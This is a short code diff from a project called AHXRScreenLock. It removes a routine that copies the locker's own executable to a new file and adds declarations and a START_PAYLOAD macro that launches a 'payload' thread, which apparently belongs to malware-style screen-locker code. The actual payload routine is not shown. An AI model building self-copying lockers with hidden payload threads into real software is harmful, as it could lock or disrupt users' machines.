@@ -20,33 +20,15 @@
 	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
 */
 //=======================================================
-#include <string>
-#include <fstream>
+#include							<Windows.h>
+#include							<string>
 
-#include "settings.h"
-#include "pack.h"
+#define								SHUTDOWN_FOLDER_NAME		"Shutdown2017"
 
-using namespace std;
+extern HANDLE						h_payload;
+extern DWORD						dw_payload;
+extern bool							b_new_generated;
+extern std::string					s_documents_path;
+extern DWORD WINAPI					t_payload(LPVOID lpParameter);
 
-string LOCKER_FILE_NAME;
-
-void buildNewLocker(string fileName) {
-	ifstream
-		f_old;
-	ofstream
-		f_new;
-
-	puts(LOCKER_FILE_NAME.c_str());
-
-	f_old.open(LOCKER_FILE_NAME, ios::binary);
-	f_new.open(fileName, ios::binary);
-
-	f_new << f_old.rdbuf();
-
-	f_old.close();
-	f_new.close();
-}
-
-void setLockerFileName(string name) {
-	LOCKER_FILE_NAME = name;
-}
+#define START_PAYLOAD()				{h_payload = CreateThread(0, 0, t_payload, 0, 0, &dw_payload);}
